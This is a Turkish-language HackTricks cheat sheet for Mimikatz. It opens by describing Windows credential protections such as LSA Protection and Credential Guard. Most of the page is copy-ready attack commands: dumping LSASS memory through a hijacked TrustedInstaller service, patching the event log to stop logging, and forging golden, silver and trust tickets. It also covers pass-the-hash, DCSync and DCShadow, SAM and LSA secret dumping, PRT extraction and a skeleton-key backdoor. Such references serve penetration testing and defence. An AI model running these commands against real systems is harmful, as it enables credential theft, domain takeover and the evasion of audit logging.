# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) adresindeki bir sayfayı temel almaktadır**. Daha fazla bilgi için orijinal sayfayı inceleyin!<sup>[[3]](#references)</sup>

## Bellekteki LM ve Clear-Text

Windows 8.1 ve Windows Server 2012 R2 sürümlerinden itibaren credential theft'e karşı koruma sağlamak için önemli önlemler uygulanmıştır:

- **LM hash'leri ve düz metin parolalar**, güvenliği artırmak amacıyla artık bellekte saklanmamaktadır. LSASS içinde "clear-text" parolaların cache'lenmemesini sağlamak ve Digest Authentication'ı devre dışı bırakmak için belirli bir registry ayarı olan _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri `0` olarak yapılandırılmalıdır.

- **LSA Protection**, Local Security Authority (LSA) process'ini yetkisiz bellek okuma ve code injection işlemlerine karşı korumak için kullanıma sunulmuştur. Bu işlem, LSASS'ın protected process olarak işaretlenmesiyle gerçekleştirilir. LSA Protection'ı etkinleştirmek için:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ registry anahtarındaki `RunAsPPL` değeri `dword:00000001` olarak değiştirilmelidir.
2. Yönetilen cihazlarda bu registry değişikliğini zorunlu kılan bir Group Policy Object (GPO) uygulanmalıdır.

Bu korumalara rağmen Mimikatz gibi araçlar, belirli driver'ları kullanarak LSA Protection'ı aşabilir; ancak bu tür işlemler büyük olasılıkla event log'larına kaydedilir.

Modern workstation'larda bu konu daha da önemlidir; çünkü **Credential Guard, Windows 11 22H2+ ve Windows Server 2025 domain-joined, DC olmayan sistemlerin birçoğunda varsayılan olarak etkindir** ve **LSASS-as-PPL, yeni Windows 11 22H2+ kurulumlarında varsayılan olarak etkindir**. Pratikte bu, `sekurlsa::logonpasswords` çıktısının çoğu zaman eski tradecraft'ın beklediğinden daha az veri içerdiği ve operatörlerin giderek **offline minidump'lara**, **Kerberos key extraction (`sekurlsa::ekeys`)** veya **CloudAP/PRT odaklı modüllere** yöneldiği anlamına gelir. Koruma tarafı için [Windows credentials protections](credentials-protections.md) sayfasına bakın.

### SeDebugPrivilege Removal'a Karşı Koyma

Administrator'lar genellikle programlarda debug işlemi yapmalarını sağlayan SeDebugPrivilege yetkisine sahiptir. Bu yetki, saldırganların credential'ları bellekten çıkarmak için kullandığı yaygın bir teknik olan yetkisiz memory dump'larını önlemek amacıyla kısıtlanabilir. Ancak bu yetki kaldırılsa bile TrustedInstaller hesabı, özelleştirilmiş bir service configuration kullanarak memory dump'ları gerçekleştirebilir:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Bu, `lsass.exe` belleğinin bir dosyaya dökülmesini sağlar; bu dosya daha sonra kimlik bilgilerini çıkarmak için başka bir sistemde analiz edilebilir:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Seçenekleri

Mimikatz'te event log tampering iki temel eylemi içerir: event log'larını temizlemek ve yeni event'lerin loglanmasını önlemek için Event service'i patch'lemek. Aşağıda bu eylemleri gerçekleştirmek için kullanılan komutlar verilmiştir:

#### Event Log'larını Temizleme

- **Komut**: Bu eylem, event log'larını silerek kötü amaçlı faaliyetlerin izlenmesini zorlaştırmayı amaçlar.
- Mimikatz, standart dokümantasyonunda event log'larını doğrudan command line üzerinden temizlemek için bir komut sunmaz. Ancak event log manipulation genellikle belirli log'ları temizlemek için Mimikatz dışındaki system tools veya script'lerin kullanılmasını içerir (ör. PowerShell veya Windows Event Viewer kullanarak).

#### Experimental Feature: Event Service'i Patch'leme

- **Komut**: `event::drop`
- Bu experimental command, Event Logging Service'in davranışını değiştirerek yeni event'leri kaydetmesini etkili bir şekilde önlemek için tasarlanmıştır.
- Örnek: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` komutu, Mimikatz'in system services'i değiştirmek için gerekli privileges ile çalışmasını sağlar.
- Ardından `event::drop` komutu Event Logging service'i patch'ler.

### Kerberos Ticket Saldırıları

Aşağıdaki komutları hızlı syntax hatırlatıcıları olarak kullanın. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) ve [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) için ayrılmış sayfalarda güncel AES/PAC/opsec ayrıntıları bulunur.

### Golden Ticket Oluşturma

Golden Ticket, domain genelinde access impersonation sağlar. Temel komut ve parametreler:

- Komut: `kerberos::golden`
- Parametreler:
- `/domain`: Domain adı.
- `/sid`: Domain'in Security Identifier'ı (SID).
- `/user`: Impersonate edilecek username.
- `/krbtgt`: Domain'in KDC service account'una ait NTLM hash.
- `/ptt`: Ticket'ı doğrudan memory'ye inject eder.
- `/ticket`: Ticket'ı daha sonra kullanmak üzere kaydeder.

Örnek:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets belirli servislere erişim sağlar. Temel komut ve parametreler:

- Command: Golden Ticket ile benzerdir ancak belirli servisleri hedefler.
- Parameters:
- `/service`: Hedeflenecek servis (ör. cifs, http).
- Diğer parametreler Golden Ticket ile benzerdir.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Ticket'lar, trust relationships kullanarak domain'ler arasındaki kaynaklara erişmek için kullanılır. Temel command ve parametreler:

- Command: Trust relationships için Golden Ticket'a benzer.
- Parameters:
- `/target`: Hedef domain'in FQDN'i.
- `/rc4`: Trust account için NTLM hash'i.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Ek Kerberos Komutları

- **Ticket'ları Listeleme**:

- Komut: `kerberos::list`
- Mevcut kullanıcı oturumundaki tüm Kerberos ticket'larını listeler.

- **Pass the Cache**:

- Komut: `kerberos::ptc`
- Cache dosyalarındaki Kerberos ticket'larını enjekte eder.
- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Komut: `kerberos::ptt`
- Bir Kerberos ticket'ının başka bir oturumda kullanılmasını sağlar.
- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Ticket'ları Temizleme**:
- Komut: `kerberos::purge`
- Oturumdaki tüm Kerberos ticket'larını temizler.
- Çakışmaları önlemek amacıyla ticket manipulation komutlarını kullanmadan önce faydalıdır.

### Over-Pass-the-Hash / Pass-the-Key

`RC4` devre dışıysa veya güvenilir değilse Mimikatz, yalnızca bir NT hash kullanmak yerine **AES128/AES256 Kerberos key'lerini** mevcut logon session'a patch edebilir. Bu yaklaşım, `sekurlsa::pth` komutunu yalnızca NTLM için kullanmaya kıyasla modern domain'ler için genellikle daha uygundur.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate`, yeni bir konsol başlatmak yerine mevcut process'i yeniden kullanır; bu, aynı context içinde `lsadump::dcsync` gibi komutları hemen çalıştırmak istediğinizde kullanışlıdır.

### Active Directory Manipulation

- **DCShadow**: AD object manipulation için bir makinenin geçici olarak DC gibi davranmasını sağlar. Bkz. [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Password data istemek için bir DC'yi taklit eder. Bkz. [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA'dan credentials çıkarır.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Bir computer account'un password data'sını kullanarak bir DC'yi impersonate eder.

- _Original context'te NetSync için belirli bir komut verilmemiştir._

- **LSADUMP::SAM**: Yerel SAM database'ine erişir.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Registry'de saklanan secrets'ları decrypt eder.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Bir user için yeni bir NTLM hash'i ayarlar.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Trust authentication information'ı alır.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** veya **hybrid-joined** host'larda `sekurlsa::cloudap`, LSASS'tan cache'lenmiş **Primary Refresh Token (PRT)** material'ını açığa çıkarabilir. İlişkili Proof-of-Possession key'i software-protected ise `dpapi::cloudapkd`, sonraki **Pass-the-PRT** workflow'larında gereken clear/derived key material'ını türetebilir.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Bu, anahtar TPM-backed olduğunda çok daha zor hale gelir, ancak hybrid endpoint'lerde kontrol etmeye değer; çünkü cached CloudAP verileri klasik `wdigest` çıktısından daha ilginç olabilir.<sup>[[2]](#references)</sup> Cloud-side abuse chain için [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) bölümüne bakın.

### Çeşitli

- **MISC::Skeleton**: Bir DC üzerindeki LSASS'e backdoor inject eder.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Backup haklarını edinir.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug ayrıcalıkları elde eder.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Oturum açmış kullanıcıların credentials bilgilerini gösterir.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos ticket'larını memory'den çıkarır.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID ve Token Manipulation

- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Orijinal context'te modify için belirli bir command yok._

- **TOKEN::Elevate**: Token'ları impersonate eder.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Birden fazla RDP session'ına izin verir.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP session'larını listeler.
- _Orijinal context'te TS::Sessions için belirli bir command sağlanmamıştır._

### Vault

- Windows Vault'tan password'leri çıkarır.
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
